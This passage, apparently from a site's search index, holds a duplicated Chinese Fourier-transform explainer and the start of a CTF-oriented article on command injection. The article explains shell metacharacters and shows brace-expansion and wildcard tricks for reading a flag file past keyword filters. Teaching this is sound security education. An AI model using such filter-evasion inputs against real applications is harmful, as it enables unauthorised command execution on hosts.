\u7684\u7cbe\u534e\u7248\u3002\u76ee\u7684\u5c31\u662f\u8981\u8ba9\u4f60\u5728\u4e0d\u770b\u4efb\u4f55\u6570\u5b66\u516c\u5f0f\u7684\u60c5\u51b5\u4e0b\u7406\u89e3\u5085\u91cc\u53f6\u5206\u6790\u3002\u5982\u679c\u6709\u5174\u8da3\u4e14\u6709\u8010\u5fc3\u7684\u8bdd\u53ef\u4ee5\u70b9\u51fb\u9605\u89c8\u539f\u6587\u3002 \u9996\u5148 cite \u4e00\u4e0b\u539f\u4f5c\u8005\uff1a \u4f5c \u8005\uff1a\u97e9 \u660a \u77e5 \u4e4e\uff1aHeinrich \u5fae \u535a\uff1a@\u82b1\u751f\u6cb9\u5de5\u4eba \u77e5\u4e4e\u4e13\u680f\uff1a\u4e0e\u65f6\u95f4\u65e0\u5173\u7684\u6545\u4e8b \u8c28\u4ee5\u6b64\u6587\u732e\u7ed9\u5927\u8fde\u6d77\u4e8b\u5927\u5b66\u7684\u5434\u6960\u8001\u5e08\uff0c\u67f3\u6653\u9e23\u8001\u5e08\uff0c\u738b\u65b0\u5e74\u8001\u5e08\u4ee5\u53ca\u5f20\u6676\u6cca\u8001\u5e08\u3002 \u8f6c\u8f7d\u7684\u540c\u5b66\u8bf7\u4fdd\u7559\u4e0a\u9762\u8fd9\u53e5\u8bdd\uff0c\u8c22\u8c22\u3002\u5982\u679c\u8fd8\u80fd\u4fdd\u7559\u6587\u7ae0\u6765\u6e90\u5c31\u66f4\u611f\u6fc0\u4e0d\u5c3d\u4e86\u3002 \u4efb\u4f55\u4e00\u79cd\u6ce2\u5f62\uff0c\u90fd\u53ef\u4ee5\u770b\u4f5c\u82e5\u5e72\u5e45\u5ea6\u3001\u76f8\u4f4d\u3001\u9891\u7387\u4e0d\u540c\u7684\u6b63\u5f26\u6ce2\u7684\u53e0\u52a0\u3002\u6211\u4eec\u9996\u5148\u7528\u65b9\u6ce2\u4e3e\u4e2a\u4f8b\u5b50\uff1a \u5982\u679c\u6211\u4eec\u628a\u53e0\u52a0\u65b9\u6ce2\u6240\u9700\u7684\u82e5\u5e72\u4e2a\u6b63\u5f26\u6ce2\u5c55\u5f00\uff0c\u4f1a\u5f97\u5230\u5982\u4e0b\u6240\u793a\u7684\u56fe\u50cf\u3002 \u6211\u4eec\u4ece\u65f6\u95f4\u65b9\u5411\u53bb\u89c2\u5bdf\u8fd9\u4e2a\u6ce2\u5f62\uff0c\u5c31\u4f1a\u5f97\u5230\u4fe1\u53f7\u7684\u65f6\u57df\u56fe\u50cf\uff08\u4e5f\u5c31\u662f\u65b9\u6ce2\uff09\u3002\u5982\u679c\u6211\u4eec\u4ece\u9891\u7387\u65b9\u5411\u53bb\u89c2\u5bdf\u8fd9\u4e2a\u4fe1\u53f7\uff0c\u5c31\u4f1a\u5f97\u5230\u4fe1\u53f7\u7684\u9891\u57df\u56fe\u50cf\u3002 \u4e0d\u8fc7\uff0c\u4e0a\u56fe\u7684\u8868\u793a\u5176\u5b9e\u5e76\u4e0d\u5168\u9762\u3002\u6bcf\u4e2a\u9891\u7387\u7684\u4fe1\u53f7\u5bf9\u5e94\u7684\u4fe1\u606f\u4e0d\u4ec5\u6709\u5f3a\u5ea6\uff0c\u800c\u4e14\u8fd8\u6709\u76f8\u4f4d\u3002\u4ece\u4e0b\u56fe\u6765\u770b\uff0c\u5982\u679c\u7bad\u5934\u6240\u6307\u5411\u7684\u4fe1\u53f7\u7684\u76f8\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff08\u5373\u5411\u5de6\u6216\u5411\u53f3\u79fb\u52a8\uff09\uff0c\u90a3\u4e48\u53e0\u52a0\u5408\u6210\u7684\u6ce2\u5f62\u4e5f\u5c06\u53d1\u751f\u53d8\u5316\u3002 \u6240\u4ee5\uff0c\u5085\u91cc\u53f6\u53d8\u6362\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u590d\u6570\u7684\u6570\u7ec4\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u590d\u6570\u4ee3\u8868\u67d0\u4e00\u9891\u7387\u4e0a\u4fe1\u53f7\u7684\u5f3a\u5ea6\u548c\u76f8\u4f4d\u7684\u4fe1\u606f\u3002 \u590d\u6570\u7684\u6a21\u957f\u8868\u793a\u5f3a\u5ea6\uff0c\u590d\u6570\u7684\u89d2\u5ea6\u8868\u793a\u76f8\u4f4d\u3002 \u4fe1\u53f7\u7684\u65f6\u57df\u8868\u793a\u548c\u9891\u57df\u8868\u793a\u662f\u7b49\u4ef7\u7684\uff0c\u5f97\u5230\u5176\u4e2d\u4e00\u4e2a\u5c31\u53ef\u4ee5\u5f97\u5230\u53e6\u4e00\u4e2a\u3002\u5982\u679c\u6709\u65f6\u57df\u4fe1\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528\u5085\u91cc\u53f6\u53d8\u6362\u5f97\u5230\u9891\u57df\u4fe1\u53f7\u3002\u5982\u679c\u6709\u9891\u57df\u4fe1\u53f7\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u9006\u5085\u91cc\u53f6\u53d8\u6362\u5f97\u5230\u65f6\u57df\u4fe1\u53f7\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/12/26/\u5085\u91cc\u53f6\u53d8\u6362/","title":"\u5085\u91cc\u53f6\u53d8\u6362"},{"location":"other/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/#_1","text":"\u672c\u6587\u662f \u5982\u679c\u770b\u4e86\u6b64\u6587\u4f60\u8fd8\u4e0d\u61c2\u5085\u91cc\u53f6\u53d8\u6362\uff0c\u90a3\u5c31\u8fc7\u6765\u6390\u6b7b\u6211\u5427 \u7684\u7cbe\u534e\u7248\u3002\u76ee\u7684\u5c31\u662f\u8981\u8ba9\u4f60\u5728\u4e0d\u770b\u4efb\u4f55\u6570\u5b66\u516c\u5f0f\u7684\u60c5\u51b5\u4e0b\u7406\u89e3\u5085\u91cc\u53f6\u5206\u6790\u3002\u5982\u679c\u6709\u5174\u8da3\u4e14\u6709\u8010\u5fc3\u7684\u8bdd\u53ef\u4ee5\u70b9\u51fb\u9605\u89c8\u539f\u6587\u3002 \u9996\u5148 cite \u4e00\u4e0b\u539f\u4f5c\u8005\uff1a \u4f5c \u8005\uff1a\u97e9 \u660a \u77e5 \u4e4e\uff1aHeinrich \u5fae \u535a\uff1a@\u82b1\u751f\u6cb9\u5de5\u4eba \u77e5\u4e4e\u4e13\u680f\uff1a\u4e0e\u65f6\u95f4\u65e0\u5173\u7684\u6545\u4e8b \u8c28\u4ee5\u6b64\u6587\u732e\u7ed9\u5927\u8fde\u6d77\u4e8b\u5927\u5b66\u7684\u5434\u6960\u8001\u5e08\uff0c\u67f3\u6653\u9e23\u8001\u5e08\uff0c\u738b\u65b0\u5e74\u8001\u5e08\u4ee5\u53ca\u5f20\u6676\u6cca\u8001\u5e08\u3002 \u8f6c\u8f7d\u7684\u540c\u5b66\u8bf7\u4fdd\u7559\u4e0a\u9762\u8fd9\u53e5\u8bdd\uff0c\u8c22\u8c22\u3002\u5982\u679c\u8fd8\u80fd\u4fdd\u7559\u6587\u7ae0\u6765\u6e90\u5c31\u66f4\u611f\u6fc0\u4e0d\u5c3d\u4e86\u3002 \u4efb\u4f55\u4e00\u79cd\u6ce2\u5f62\uff0c\u90fd\u53ef\u4ee5\u770b\u4f5c\u82e5\u5e72\u5e45\u5ea6\u3001\u76f8\u4f4d\u3001\u9891\u7387\u4e0d\u540c\u7684\u6b63\u5f26\u6ce2\u7684\u53e0\u52a0\u3002\u6211\u4eec\u9996\u5148\u7528\u65b9\u6ce2\u4e3e\u4e2a\u4f8b\u5b50\uff1a \u5982\u679c\u6211\u4eec\u628a\u53e0\u52a0\u65b9\u6ce2\u6240\u9700\u7684\u82e5\u5e72\u4e2a\u6b63\u5f26\u6ce2\u5c55\u5f00\uff0c\u4f1a\u5f97\u5230\u5982\u4e0b\u6240\u793a\u7684\u56fe\u50cf\u3002 \u6211\u4eec\u4ece\u65f6\u95f4\u65b9\u5411\u53bb\u89c2\u5bdf\u8fd9\u4e2a\u6ce2\u5f62\uff0c\u5c31\u4f1a\u5f97\u5230\u4fe1\u53f7\u7684\u65f6\u57df\u56fe\u50cf\uff08\u4e5f\u5c31\u662f\u65b9\u6ce2\uff09\u3002\u5982\u679c\u6211\u4eec\u4ece\u9891\u7387\u65b9\u5411\u53bb\u89c2\u5bdf\u8fd9\u4e2a\u4fe1\u53f7\uff0c\u5c31\u4f1a\u5f97\u5230\u4fe1\u53f7\u7684\u9891\u57df\u56fe\u50cf\u3002 \u4e0d\u8fc7\uff0c\u4e0a\u56fe\u7684\u8868\u793a\u5176\u5b9e\u5e76\u4e0d\u5168\u9762\u3002\u6bcf\u4e2a\u9891\u7387\u7684\u4fe1\u53f7\u5bf9\u5e94\u7684\u4fe1\u606f\u4e0d\u4ec5\u6709\u5f3a\u5ea6\uff0c\u800c\u4e14\u8fd8\u6709\u76f8\u4f4d\u3002\u4ece\u4e0b\u56fe\u6765\u770b\uff0c\u5982\u679c\u7bad\u5934\u6240\u6307\u5411\u7684\u4fe1\u53f7\u7684\u76f8\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff08\u5373\u5411\u5de6\u6216\u5411\u53f3\u79fb\u52a8\uff09\uff0c\u90a3\u4e48\u53e0\u52a0\u5408\u6210\u7684\u6ce2\u5f62\u4e5f\u5c06\u53d1\u751f\u53d8\u5316\u3002 \u6240\u4ee5\uff0c\u5085\u91cc\u53f6\u53d8\u6362\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u590d\u6570\u7684\u6570\u7ec4\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u590d\u6570\u4ee3\u8868\u67d0\u4e00\u9891\u7387\u4e0a\u4fe1\u53f7\u7684\u5f3a\u5ea6\u548c\u76f8\u4f4d\u7684\u4fe1\u606f\u3002 \u590d\u6570\u7684\u6a21\u957f\u8868\u793a\u5f3a\u5ea6\uff0c\u590d\u6570\u7684\u89d2\u5ea6\u8868\u793a\u76f8\u4f4d\u3002 \u4fe1\u53f7\u7684\u65f6\u57df\u8868\u793a\u548c\u9891\u57df\u8868\u793a\u662f\u7b49\u4ef7\u7684\uff0c\u5f97\u5230\u5176\u4e2d\u4e00\u4e2a\u5c31\u53ef\u4ee5\u5f97\u5230\u53e6\u4e00\u4e2a\u3002\u5982\u679c\u6709\u65f6\u57df\u4fe1\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528\u5085\u91cc\u53f6\u53d8\u6362\u5f97\u5230\u9891\u57df\u4fe1\u53f7\u3002\u5982\u679c\u6709\u9891\u57df\u4fe1\u53f7\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u9006\u5085\u91cc\u53f6\u53d8\u6362\u5f97\u5230\u65f6\u57df\u4fe1\u53f7\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/12/26/\u5085\u91cc\u53f6\u53d8\u6362/","title":"\u5085\u91cc\u53f6\u53d8\u6362"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/","text":"\u5de7\u7528\u547d\u4ee4\u6ce8\u5165\u7684N\u79cd\u65b9\u5f0f \u200b \u672c\u6587\u9996\u53d1\u4e8e\u8865\u5929\u5e73\u53f0\uff0c\u5730\u5740\uff1ahttps://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw \u5728 NUAACTF_2018 \u4e2d\uff0c\u6211\u51fa\u4e86\u4e00\u9053\u6bd4\u8f83\u6c34\u7684\u91c7\u7528 Spring \u6846\u67b6\u7684 SSRF + Java Deserialization + Command Injection \u3002\u4e2a\u4eba\u89c9\u5f97\u5728\u51fa\u9898\u65f6\u5019\u4e5f\u5b66\u4e60\u5230\u4e86\u4e0d\u5c11\u77e5\u8bc6\uff0c\u7279\u522b\u662f\u5728 Command Injection \u8fd9\u4e00\u5757\u8ba9\u6211\u5bf9 Command Injection \u6709\u4e86\u65b0\u7684\u770b\u6cd5\u3002 \u547d\u4ee4\u6267\u884c \u7406\u8bba\u57fa\u7840 Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation. This attack differs from Code Injection , in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code. \u4ee5\u4e0a\u6765\u81ea Command Injection - OWASP \uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\u901a\u8fc7\u6613\u53d7\u653b\u51fb\u7684\u5e94\u7528\u7a0b\u5e8f\u5728\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u5c06\u4e0d\u5b89\u5168\u7684\u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\uff08\u8868\u5355\uff0ccookie\uff0cHTTP\u6807\u5934\u7b49\uff09\u4f20\u9012\u7ed9\u7cfb\u7edfshell\u65f6\uff0c\u53ef\u80fd\u4f1a\u53d1\u751f\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u3002 \u5728\u6b64\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u901a\u5e38\u4ee5\u6613\u53d7\u653b\u51fb\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u6743\u9650\u6267\u884c\u3002 \u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u5f88\u53ef\u80fd\u4e3b\u8981\u662f\u7531\u4e8e\u8f93\u5165\u9a8c\u8bc1\u4e0d\u8db3\u3002\u6b64\u653b\u51fb\u4e0e\u4ee3\u7801\u6ce8\u5165\u4e0d\u540c\uff0c\u56e0\u4e3a\u4ee3\u7801\u6ce8\u5165\u5141\u8bb8\u653b\u51fb\u8005\u6dfb\u52a0\u81ea\u5df1\u7684\u4ee3\u7801\uff0c\u7136\u540e\u7531\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u3002 \u5728\u547d\u4ee4\u6ce8\u5165\u4e2d\uff0c\u653b\u51fb\u8005\u6269\u5c55\u4e86\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u529f\u80fd\uff0c\u800c\u65e0\u9700\u6ce8\u5165\u4ee3\u7801\u3002 \u200b \u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u6700\u521d\u88ab\u79f0\u4e3aShell\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\uff0c\u662f\u7531\u632a\u5a01\u4e00\u540d\u7a0b\u5e8f\u5458\u57281997\u5e74\u610f\u5916\u53d1\u73b0\u7684\u3002\u7b2c\u4e00\u4e2a\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u7a0b\u5e8f\u80fd\u968f\u610f\u5730\u4ece\u4e00\u4e2a\u7f51\u7ad9\u5220\u9664\u7f51\u9875\uff0c\u5c31\u50cf\u4ece\u78c1\u76d8\u6216\u8005\u786c\u76d8\u79fb\u9664\u6587\u4ef6\u4e00\u6837\u7b80\u5355\u3002 \u2014\u2014\u767e\u5ea6\u767e\u79d1 \u7279\u6b8a\u7b26\u53f7 \u8bb2\u5230\u547d\u4ee4\u6ce8\u5165\uff0c\u5c31\u4e0d\u5f97\u4e0d\u63d0\u5230\u7279\u6b8a\u7b26\u53f7\u7684\u8fd0\u7528\u3002\u4f8b\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\u7684 | \u7ba1\u9053\u7b26\uff0c\u8fd8\u6709\u6bd4\u8f83\u591a\u7684\u7c7b\u4f3c\u6709\u5947\u6548\u7684\u7b26\u53f7\u7ec4\u5408\u3002 | \u8fde\u7ed3\u4e0a\u4e2a\u6307\u4ee4\u7684\u6807\u51c6\u8f93\u51fa\uff0c\u505a\u4e3a\u4e0b\u4e2a\u6307\u4ee4\u7684\u6807\u51c6\u8f93\u5165\u3002 & \u7528\u6237\u6709\u65f6\u5019\u6267\u884c\u547d\u4ee4\u8981\u82b1\u5f88\u957f\u65f6\u95f4\uff0c\u53ef\u80fd\u4f1a\u5f71\u54cd\u505a\u5176\u4ed6\u4e8b\u60c5\u3002\u6700\u597d\u7684\u65b9\u6cd5\u662f\u5c06\u5b83\u653e\u5728\u540e\u53f0\u6267\u884c\u3002\u540e\u53f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u5728\u7528\u6237\u6ce8\u9500\u540e\u7cfb\u7edf\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u3002\u5f53\u8981\u628a\u547d\u4ee4\u653e\u5728\u540e\u53f0\u6267\u884c\u65f6\uff0c\u5728\u547d\u4ee4\u7684\u540e\u9762\u52a0\u4e0a & \u3002 Linux\u4e2d\u7684&&\u4e0e|| shell \u5728\u6267\u884c\u67d0\u4e2a\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u8fd4\u56de\u503c\uff0c\u8be5\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 shell \u53d8\u91cf $? \u4e2d\u3002\u5f53 $? == 0 \u65f6\uff0c\u8868\u793a\u6267\u884c\u6210\u529f\uff1b\u5f53 $? == 1 \u65f6\uff0c\u8868\u793a\u6267\u884c\u5931\u8d25\u3002\u6709\u65f6\u5019\uff0c\u4e0b\u4e00\u6761\u547d\u4ee4\u4f9d\u8d56\u524d\u4e00\u6761\u547d\u4ee4\u662f\u5426\u6267\u884c\u6210\u529f\u3002\u5982\uff1a\u5728\u6210\u529f\u5730\u6267\u884c\u4e00\u6761\u547d\u4ee4\u4e4b\u540e\u518d\u6267\u884c\u53e6\u4e00\u6761\u547d\u4ee4\uff0c\u6216\u8005\u5728\u4e00\u6761\u547d\u4ee4\u6267\u884c\u5931\u8d25\u540e\u518d\u6267\u884c\u53e6\u4e00\u6761\u547d\u4ee4\u7b49\u3002 shell \u63d0\u4f9b\u4e86 && \u548c || \u6765\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u63a7\u5236\u7684\u529f\u80fd\uff0c shell \u5c06\u6839\u636e && \u6216 || \u524d\u9762\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u6765\u63a7\u5236\u5176\u540e\u9762\u547d\u4ee4\u7684\u6267\u884c\u3002 && \u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a command1 && command2 [&& command3 ...] \u547d\u4ee4\u4e4b\u95f4\u4f7f\u7528 && \u8fde\u63a5\uff0c\u5b9e\u73b0\u903b\u8f91\u4e0e\u7684\u529f\u80fd\u3002 \u53ea\u6709\u5728 && \u5de6\u8fb9\u7684\u547d\u4ee4\u8fd4\u56de\u771f\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 0 \uff09\uff0c && \u53f3\u8fb9\u7684\u547d\u4ee4\u624d\u4f1a\u88ab\u6267\u884c \u53ea\u8981\u6709\u4e00\u4e2a\u547d\u4ee4\u8fd4\u56de\u5047\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 1 \uff09\uff0c\u540e\u9762\u7684\u547d\u4ee4\u5c31\u4e0d\u4f1a\u88ab\u6267\u884c $ cp ~/Desktop/1.txt ~/1.txt && rm ~/Desktop/1.txt && echo \"success\" \u793a\u4f8b \u4e2d\u7684\u547d\u4ee4\u9996\u5148\u4ece ~/Desktop \u76ee\u5f55\u590d\u5236 1.txt \u6587\u4ef6\u5230 ~ \u76ee\u5f55\uff1b\u6267\u884c\u6210\u529f\u540e\uff0c\u4f7f\u7528 rm \u5220\u9664\u6e90\u6587\u4ef6\uff1b\u5982\u679c\u5220\u9664\u6210\u529f\u5219\u8f93\u51fa\u63d0\u793a\u4fe1\u606f\u3002 || \u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a command1 || command2 [|| command3 ...] \u547d\u4ee4\u4e4b\u95f4\u4f7f\u7528 || \u8fde\u63a5\uff0c\u5b9e\u73b0\u903b\u8f91\u6216\u7684\u529f\u80fd\u3002 \u53ea\u6709\u5728 || \u5de6\u8fb9\u7684\u547d\u4ee4\u8fd4\u56de\u5047\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 1 \uff09\uff0c || \u53f3\u8fb9\u7684\u547d\u4ee4\u624d\u4f1a\u88ab\u6267\u884c\u3002\u8fd9\u548c c \u8bed\u8a00\u4e2d\u7684\u903b\u8f91\u6216\u8bed\u6cd5\u529f\u80fd\u76f8\u540c\uff0c\u5373\u5b9e\u73b0\u77ed\u8def\u903b\u8f91\u6216\u64cd\u4f5c\u3002 \u53ea\u8981\u6709\u4e00\u4e2a\u547d\u4ee4\u8fd4\u56de\u771f\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 0 \uff09\uff0c\u540e\u9762\u7684\u547d\u4ee4\u5c31\u4e0d\u4f1a\u88ab\u6267\u884c\u3002 $ rm ~/Desktop/1.txt || echo \"fail\" \u5982\u679c ~/Desktop \u76ee\u5f55\u4e0b\u4e0d\u5b58\u5728\u6587\u4ef6 1.txt\uff0c\u5c06\u8f93\u51fa\u63d0\u793a\u4fe1\u606f\u3002 ;\u5206\u53f7 \u5f53\u6709\u51e0\u4e2a\u547d\u4ee4\u8981\u8fde\u7eed\u6267\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u4eec\u653e\u5728\u4e00\u884c\u5185\uff0c\u4e2d\u95f4\u7528 ; \u5206\u5f00\u3002 `\u53cd\u5f15\u53f7\uff08\u91cd\u97f3\u7b26\uff09 \u547d\u4ee4\u66ff\u4ee3\uff0c\u5927\u90e8\u5206 Unix shell \u4ee5\u53ca\u7f16\u7a0b\u8bed\u8a00\u5982 Perl \u3001 PHP \u4ee5\u53ca Ruby \u7b49\u90fd\u4ee5\u6210\u5bf9\u7684\u91cd\u97f3\u7b26(\u53cd\u5f15\u53f7)\u4f5c\u6307\u4ee4\u66ff\u4ee3\uff0c\u610f\u601d\u662f\u4ee5\u67d0\u4e00\u4e2a\u6307\u4ee4\u7684\u8f93\u51fa\u7ed3\u679c\u4f5c\u4e3a\u53e6\u4e00\u4e2a\u6307\u4ee4\u7684\u8f93\u5165\u9879\u3002\u4f8b\u5982\u4ee5\u4e0b\u6307\u4ee4: echo It is now `date` \u7b49\u4ef7\u4e8e\uff1a echo It is now \u4e00 12\u6708 17 12:16:04 GMT 2018 \u5728\u6b63\u5f0f\u6267\u884c\u65f6\u4f1a\u4ea7\u751f\u4ee5\u4e0b\u8f93\u51fa\u7ed3\u679c\uff1a It is now \u4e00 12\u6708 17 12:16:04 GMT 2018 \u2018\u5355\u5f15\u53f7 \u88ab\u5355\u5f15\u53f7\u62ec\u4f4f\u7684\u5185\u5bb9,\u5c06\u88ab\u89c6\u4e3a\u5355\u4e00\u5b57\u7b26\u4e32\u3002\u5728\u5f15\u53f7\u5185\u7684\u53d8\u91cf $ \u7b26\u53f7\u5c06\u4f1a\u5931\u6548\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c06\u88ab\u89c6\u4f5c\u4e00\u822c\u7b26\u53f7\u5904\u7406\u3002 \u201c\u53cc\u5f15\u53f7 \u88ab\u53cc\u5f15\u53f7\u62ec\u4f4f\u7684\u5185\u5bb9\uff0c\u5c06\u88ab\u89c6\u4e3a\u5355\u4e00\u5b57\u7b26\u4e32\uff0c\u9632\u6b62\u901a\u914d\u7b26\u7684\u6269\u5c55\uff0c\u4f46\u5141\u8bb8\u53d8\u91cf\u6269\u5c55 \uff0c\u8fd9\u70b9\u4e0e\u5355\u5f15\u53f7\u7684\u5904\u7406\u65b9\u5f0f\u4e0d\u540c ()\u6307\u4ee4\u7fa4\u7ec4 \u683c\u5f0f\u4e3a\uff1a(command1;command2[;command3\u2026]) \u4e00\u6761\u547d\u4ee4\u9700\u8981\u72ec\u5360\u4e00\u4e2a\u7269\u7406\u884c\uff0c\u5982\u679c\u9700\u8981\u5c06\u591a\u6761\u547d\u4ee4\u653e\u5728\u540c\u4e00\u884c\uff0c\u547d\u4ee4\u4e4b\u95f4\u4f7f\u7528\u547d\u4ee4\u5206\u9694\u7b26\uff08;\uff09\u5206\u9694\u3002\u6267\u884c\u7684\u6548\u679c\u7b49\u540c\u4e8e\u591a\u4e2a\u72ec\u7acb\u7684\u547d\u4ee4\u5355\u72ec\u6267\u884c\u7684\u6548\u679c\u3002 \u8868\u793a\u5728\u5f53\u524d shell \u4e2d\u5c06\u591a\u4e2a\u547d\u4ee4\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u6267\u884c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4f7f\u7528 () \u62ec\u8d77\u6765\u7684\u547d\u4ee4\u5728\u6267\u884c\u524d\u9762\u90fd\u4e0d\u4f1a\u5207\u6362\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\uff0c\u4e5f\u5c31\u662f\u8bf4\u547d\u4ee4\u7ec4\u5408\u90fd\u662f\u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e0b\u88ab\u6267\u884c\u7684\uff0c\u5c3d\u7ba1\u547d\u4ee4\u4e2d\u6709\u5207\u6362\u76ee\u5f55\u7684\u547d\u4ee4\u3002 \u547d\u4ee4\u7ec4\u5408\u5e38\u548c\u547d\u4ee4\u6267\u884c\u63a7\u5236\u7ed3\u5408\u8d77\u6765\u4f7f\u7528\u3002 \u7528\u62ec\u53f7\u5c06\u4e00\u4e32\u8fde\u7eed\u6307\u4ee4\u62ec\u8d77\u6765\uff0c\u8fd9\u79cd\u7528\u6cd5\u5bf9 shell \u6765\u8bf4\uff0c\u79f0\u4e3a\u6307\u4ee4\u7fa4\u7ec4\u3002\u5982\u4e0b\u9762\u7684\u4f8b\u5b50: (cd ~ ; vcgh=`pwd` ;echo $vcgh) \u6307\u4ee4\u7fa4\u7ec4\u6709\u4e00\u4e2a\u7279\u6027\uff0cshell\u4f1a\u4ee5\u4ea7\u751f subshell \u6765\u6267\u884c\u8fd9\u7ec4\u6307\u4ee4\u3002 $ rm ~/Desktop/1.txt || (cd ~/Desktop/;ls -a;echo \"fail\") \u5982\u679c\u76ee\u5f55 ~/Desktop \u4e0b\u4e0d\u5b58\u5728\u6587\u4ef6 1.txt\uff0c\u5219\u6267\u884c\u547d\u4ee4\u7ec4\u5408\u3002 (()) \u8fd9\u7ec4\u7b26\u53f7\u7684\u4f5c\u7528\u4e0e let \u6307\u4ee4\u76f8\u4f3c\uff0c\u7528\u5728\u7b97\u6570\u8fd0\u7b97\u4e0a\uff0c\u662f bash \u7684\u5185\u5efa\u529f\u80fd\u3002\u6240\u4ee5\uff0c\u5728\u6267\u884c\u6548\u7387\u4e0a\u4f1a\u6bd4\u4f7f\u7528 let\u6307\u4ee4\u8981\u597d\u8bb8\u591a\u3002 #!/bin/bash(( a = 10 ))echo -e \"inital value, a = $a\\n\"(( a++))echo \"after a++, a = $a\" {}\u5927\u62ec\u53f7 \u5176\u5b9e\u5927\u62ec\u53f7\u6709\u4e00\u79cd\u62fc\u63a5\u5b57\u7b26\u4e32\u7684\u7528\u6cd5\uff0c {xx,yy,zz,...} \u8fd9\u79cd\u5927\u62ec\u53f7\u7684\u7ec4\u5408\uff0c\u5e38\u7528\u5728\u5b57\u4e32\u7684\u7ec4\u5408\u4e0a\uff0c\u6765\u770b\u4e2a\u4f8b\u5b50 mkdir {userA,userB,userC}-{home,bin,data} \u6211\u4eec\u5f97\u5230 userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data \u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u6709 $ cat {/fl,/fla}{ag,g} flag{xxx} cat: /flg: No such file or directory cat: /flaag: No such file or directory flag{xxx} []\u4e2d\u62ec\u53f7 \u5e38\u51fa\u73b0\u5728\u6d41\u7a0b\u63a7\u5236\u4e2d\uff0c\u626e\u6f14\u62ec\u4f4f\u5224\u65ad\u5f0f\u7684\u4f5c\u7528\u3002 if [ \"$?\" != 0 ]thenecho \"Executes error\"exit1fi \u3002\u8fd9\u4e2a\u7b26\u53f7\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u62c5\u4efb\u7c7b\u4f3c \u201c\u8303\u56f4\u201d \u6216 \u201c\u96c6\u5408\u201d \u7684\u89d2\u8272\u3002 $ cat /fl[0-z]g flag{xxx} [[ ]] \u8fd9\u7ec4\u7b26\u53f7\u4e0e\u5148\u524d\u7684 [] \u7b26\u53f7\uff0c\u57fa\u672c\u4e0a\u4f5c\u7528\u76f8\u540c\uff0c\u4f46\u5979\u5141\u8bb8\u5728\u5176\u4e2d\u76f4\u63a5\u4f7f\u7528 || \u4e0e && \u903b\u8f91\u7b49\u7b26\u53f7\u3002 #!/bin/bashread akif [[ $ak > 5 || $ak< 9 ]]thenecho $akfi \u5c0f\u62ec\u53f7\uff0c\u4e2d\u62ec\u53f7\uff0c\u548c\u5927\u62ec\u53f7\u7684\u533a\u522b 